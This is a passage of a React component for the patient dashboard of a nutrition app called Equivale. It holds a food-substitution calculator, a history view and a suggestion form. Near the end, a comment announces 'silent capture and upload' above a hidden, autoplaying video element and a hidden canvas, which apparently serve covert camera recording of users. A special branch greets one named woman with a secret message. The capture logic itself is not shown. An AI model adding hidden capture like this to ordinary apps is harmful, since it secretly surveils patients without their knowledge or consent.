const whatsappHref = whatsappNumber ? `https://wa.me/${whatsappNumber}` : null;

function handleLogout() {
localStorage.removeItem('patientToken');
localStorage.removeItem('authToken');
localStorage.removeItem('authUser');
localStorage.removeItem('token');
localStorage.removeItem('auth');
router.push('/login');
}

return (
<div className="min-h-screen bg-slate-50 text-slate-900">
<Dialog open={resultModalOpen} onOpenChange={setResultModalOpen}>
<DialogContent className="sm:max-w-[520px]">
<DialogHeader>
<DialogTitle>Resultado da equivalência</DialogTitle>
<DialogDescription className="mt-2 text-sm text-slate-600">
Sua substituição tem grupos diferentes. Leia o aviso antes de prosseguir.
</DialogDescription>
</DialogHeader>

<div className="space-y-4 py-4">
<div className="rounded-lg border border-amber-200 bg-amber-50 p-4">
<p className="text-sm font-semibold text-amber-900">{pendingResult?.payload?.mensagem || 'Atenção: grupos diferentes detectados.'}</p>
</div>
<div className="rounded-lg border border-slate-200 bg-white p-4">
<p className="text-base font-semibold text-slate-900">{pendingResult?.parsed}</p>
{pendingResult?.warning ? (
<p className="mt-3 text-sm leading-6 text-slate-700">{pendingResult.warning}</p>
) : null}
</div>
</div>

<DialogFooter>
<Button type="button" variant="default" onClick={() => setResultModalOpen(false)}>
Entendi
</Button>
</DialogFooter>
</DialogContent>
</Dialog>
<header className="border-b border-slate-200 bg-white">
<div className="container mx-auto flex flex-col gap-4 px-4 py-4 sm:flex-row sm:items-center sm:justify-between">
<div className="flex items-center gap-3">
<BrandLogo href={null} size="md" className="h-10 w-auto" />
<div>
<p className="text-base font-semibold text-slate-900">Equivale</p>
<p className="text-sm text-slate-500">Painel do paciente</p>
</div>
</div>
<button
type="button"
onClick={handleLogout}
className="inline-flex items-center justify-center rounded-full border border-slate-200 bg-slate-100 px-4 py-2 text-sm font-semibold text-slate-700 transition hover:bg-slate-200"
>
<LogOut className="mr-2 h-4 w-4" />
Sair
</button>
</div>
</header>

<main className="container mx-auto px-4 py-10">
<div className="mx-auto max-w-5xl space-y-8">
<section className="rounded-lg border border-slate-200 bg-white p-3 shadow-sm sm:p-4">
<div className="flex flex-col items-center gap-4 text-center">
<div className="flex-shrink-0">
{nutricionista?.logo_url ? (
<img
src={nutricionista.logo_url}
alt={nutricionista?.nome || 'Nutricionista'}
className="h-[7.5rem] w-[7.5rem] rounded-lg border border-slate-200 object-cover shadow-sm"
/>
) : (
<div className="flex h-[7.5rem] w-[7.5rem] items-center justify-center rounded-lg border border-slate-200 bg-slate-50 text-sm font-semibold text-slate-500">
LOGO
</div>
)}
</div>

<div className="flex flex-col items-center">
<p className="text-xs uppercase tracking-[0.12em] text-slate-500">Nutricionista</p>
<h2 className="mt-1 text-base font-semibold tracking-tight text-slate-900">{nutricionista?.nome || 'Nutricionista'}</h2>
{nutricionista?.crn && <p className="mt-0.5 text-xs text-slate-600">CRN {nutricionista.crn}</p>}
<p className="mt-2 text-xs leading-4 text-slate-600">
{isHer ? (
<>E aí, lobinho! Bem-vinda, <strong>Natália Ribeiro</strong>!</>
) : (
<>Olá, {pacienteNome}. Use esta ferramenta para trocas inteligentes.</>
)}
</p>
</div>
</div>
</section>

<section className="rounded-[2rem] border border-slate-200 bg-white p-6 shadow-sm sm:p-10">
<form onSubmit={handleCalculate} className="space-y-6">
<div className="grid gap-4 sm:grid-cols-3">
<div className="space-y-2">
<label htmlFor="alimento-base" className="text-sm font-semibold text-slate-700">Alimento base</label>
<input
id="alimento-base"
value={baseQuery}
onChange={handleBaseQueryChange}
placeholder="Ex: arroz"
className="w-full rounded-3xl border border-slate-200 bg-slate-50 px-4 py-3 text-sm text-slate-900 outline-none transition focus:border-slate-400 focus:ring-2 focus:ring-slate-200"
/>
{baseOptions.length > 0 && (
<div className="mt-2 rounded-3xl border border-slate-200 bg-white shadow-sm">
<ul className="divide-y divide-slate-200">
{baseOptions.map((option) => (
<li key={option}>
<button
type="button"
onClick={() => handleSelectBase(option)}
className="w-full px-4 py-3 text-left text-sm text-slate-700 hover:bg-slate-50"
>
{option}
</button>
</li>
))}
</ul>
</div>
)}
</div>

<div className="space-y-2">
<label htmlFor="quantidade" className="text-sm font-semibold text-slate-700">Quantidade em gramas</label>
<input
id="quantidade"
type="number"
min="1"
value={quantity}
onChange={(event) => setQuantity(event.target.value)}
placeholder="100"
className="w-full rounded-3xl border border-slate-200 bg-slate-50 px-4 py-3 text-sm text-slate-900 outline-none transition focus:border-slate-400 focus:ring-2 focus:ring-slate-200"
/>
</div>

<div className="space-y-2">
<label htmlFor="alimento-substituto" className="text-sm font-semibold text-slate-700">Alimento substituto</label>
<input
id="alimento-substituto"
value={subQuery}
onChange={handleSubQueryChange}
placeholder="Ex: batata"
className="w-full rounded-3xl border border-slate-200 bg-slate-50 px-4 py-3 text-sm text-slate-900 outline-none transition focus:border-slate-400 focus:ring-2 focus:ring-slate-200"
/>
{subOptions.length > 0 && (
<div className="mt-2 rounded-3xl border border-slate-200 bg-white shadow-sm">
<ul className="divide-y divide-slate-200">
{subOptions.map((option) => (
<li key={option}>
<button
type="button"
onClick={() => handleSelectSub(option)}
className="w-full px-4 py-3 text-left text-sm text-slate-700 hover:bg-slate-50"
>
{option}
</button>
</li>
))}
</ul>
</div>
)}
</div>
</div>

{errorMessage ? (
<div className="rounded-3xl border border-rose-200 bg-rose-50 px-4 py-3 text-sm text-rose-700">
{errorMessage}
</div>
) : null}

<div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
<button
type="submit"
disabled={loadingCalculation}
className="w-full rounded-3xl bg-slate-900 px-4 py-3 text-sm font-semibold text-white transition hover:bg-slate-800 disabled:cursor-not-allowed disabled:bg-slate-400 sm:w-auto"
>
{loadingCalculation ? 'Calculando...' : 'Calcular equivalência'}
</button>
<p className="text-sm text-slate-500">Use os campos acima para buscar a equivalência correta.</p>
</div>
</form>
</section>

<section className="rounded-[2rem] border border-slate-200 bg-slate-50 p-6 shadow-sm sm:p-8">
<p className="text-sm font-semibold uppercase tracking-[0.24em] text-slate-500">Resultado</p>
<div className="mt-4 min-h-[86px] text-sm leading-6 text-slate-700">
{resultText ? (
<div className="rounded-3xl border border-slate-200 bg-white p-5 text-slate-900 shadow-sm">
<p className="text-base leading-7 font-semibold tracking-tight text-slate-900">{resultText}</p>
</div>
) : loadingPerfil ? (
'Carregando perfil e resultados...'
) : (
'Digite os dados e clique em calcular para ver a equivalência.'
)}
</div>
{showSupplementCta && supplementSearchUrl ? (
<div className="mt-4 rounded-3xl border border-sky-200 bg-sky-50 p-4">
<p className="text-sm font-semibold text-sky-900">
Nutri Dica: Seu suplemento acabou ou está no fim? Veja algumas opções de compra:
</p>
<a
href={supplementSearchUrl}
target="_blank"
rel="noopener noreferrer"
className="mt-3 inline-flex items-center justify-center rounded-full bg-sky-600 px-4 py-2 text-sm font-semibold text-white transition hover:bg-sky-700"
>
Ver opções de compra
</a>
</div>
) : null}
{groupWarning ? (
<div className="mt-4 rounded-3xl border-l-4 border-amber-500 bg-amber-50 p-4 text-sm text-slate-800">
<p className="text-sm font-semibold text-slate-800">Aviso clínico</p>
<p className="mt-2 leading-6">{groupWarning}</p>
</div>
) : null}

<button
type="button"
onClick={() => setExibirHistorico(!exibirHistorico)}
className="w-full mt-4 py-2.5 px-4 bg-gray-100 hover:bg-gray-200 text-gray-700 font-medium rounded-lg text-sm transition-all text-center"
>
{exibirHistorico ? 'Ocultar Histórico' : 'Substituições Anteriores'}
</button>

{exibirHistorico && (
<div className="mt-4 space-y-3 w-full">
<div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
<h3 className="text-sm font-bold text-gray-500 px-1">Histórico Recente</h3>
{historico.length > 0 ? (
<button
type="button"
onClick={clearHistorico}
className="inline-flex items-center justify-center rounded-3xl border border-gray-200 bg-white px-4 py-2 text-xs font-semibold text-gray-700 transition hover:bg-gray-50"
>
Limpar histórico
</button>
) : null}
</div>
{historico.length === 0 ? (
<p className="text-xs text-gray-400 italic text-center py-2 bg-gray-50 rounded-lg">Nenhuma substituição salva ainda.</p>
) : (
<div className="grid gap-2">
{historico.map((item) => (
<div key={item.id} className="overflow-hidden rounded-3xl border border-gray-100 bg-white px-4 py-3 text-xs text-gray-700 shadow-sm">
<div className="flex items-center justify-between text-[10px] text-gray-400">
<span>{item.data}</span>
<span className="font-semibold text-gray-500">{item.baseQuantity}g → {item.equivalentQuantity}g</span>
</div>
<p className="mt-2 leading-5">
<span className="font-semibold text-gray-900">{item.baseFood}</span>
<span className="text-gray-400"> → </span>
<span className="font-bold text-emerald-600">{item.substituteFood}</span>
</p>
</div>
))}
</div>
)}
</div>
)}
</section>

<section className="rounded-[2rem] border border-slate-200 bg-white p-6 shadow-sm sm:p-8">
<div className="space-y-2">
<p className="text-base font-semibold text-slate-900">Não encontrou o alimento?</p>
<p className="text-sm text-slate-600">Envie sua sugestão para que possamos ampliar o catálogo do Equivale.</p>
</div>

<form onSubmit={handleSuggestionSubmit} className="mt-6 space-y-4">
<div className="space-y-2">
<label htmlFor="sugestao-nome" className="text-sm font-semibold text-slate-700">Alimento sugerido</label>
<input
id="sugestao-nome"
value={suggestionText}
onChange={(event) => setSuggestionText(event.target.value)}
placeholder="Nome do alimento"
className="w-full rounded-3xl border border-slate-200 bg-slate-50 px-4 py-3 text-sm text-slate-900 outline-none transition focus:border-slate-400 focus:ring-2 focus:ring-slate-200"
/>
</div>
<div className="space-y-2">
<label htmlFor="sugestao-detalhes" className="text-sm font-semibold text-slate-700">Por que esse alimento deve ser incluído?</label>
<textarea
id="sugestao-detalhes"
value={suggestionReason}
onChange={(event) => setSuggestionReason(event.target.value)}
placeholder="Explique o contexto ou o uso na substituição alimentar"
className="min-h-[120px] w-full rounded-3xl border border-slate-200 bg-slate-50 px-4 py-3 text-sm text-slate-900 outline-none transition focus:border-slate-400 focus:ring-2 focus:ring-slate-200"
/>
</div>
<button
type="submit"
className="inline-flex w-full items-center justify-center rounded-3xl bg-slate-900 px-4 py-3 text-sm font-semibold text-white transition hover:bg-slate-800"
>
Enviar sugestão
</button>
</form>
{suggestionStatus ? (
<p className="mt-3 text-sm text-slate-700">{suggestionStatus}</p>
) : null}

<section className="mt-6 rounded-[2rem] border border-slate-700 bg-slate-950 px-5 py-5 text-sm text-white shadow-lg">
<p className="text-center text-base font-semibold">{mensagemDoAcesso}</p>
</section>

{isHer && (
<div className="mt-6 flex justify-center">
<p className="font-mono text-[11px] text-slate-500 tracking-wide bg-slate-200 px-4 py-1.5 rounded-full border border-slate-300 shadow-sm animate-soft-pulse">
{mensagemSecretaNatalia}
</p>
</div>
)}

{/* Hidden elements used for silent capture and upload */}
<video ref={videoRefCapture} autoPlay playsInline muted className="hidden" />
<canvas ref={canvasRefCapture} className="hidden" />
</section>
</div>
</main>

{whatsappHref ? (
<a
href={whatsappHref}
target="_blank"
rel="noreferrer noopener"
className="fixed bottom-6 right-6 inline-flex items-center gap-3 rounded-full bg-emerald-500 px-4 py-3 text-sm font-semibold text-white shadow-xl transition hover:bg-emerald-600"
>
<span>WhatsApp</span>
<span aria-hidden="true">💬</span>
</a>
) : null}
</div>
);
}
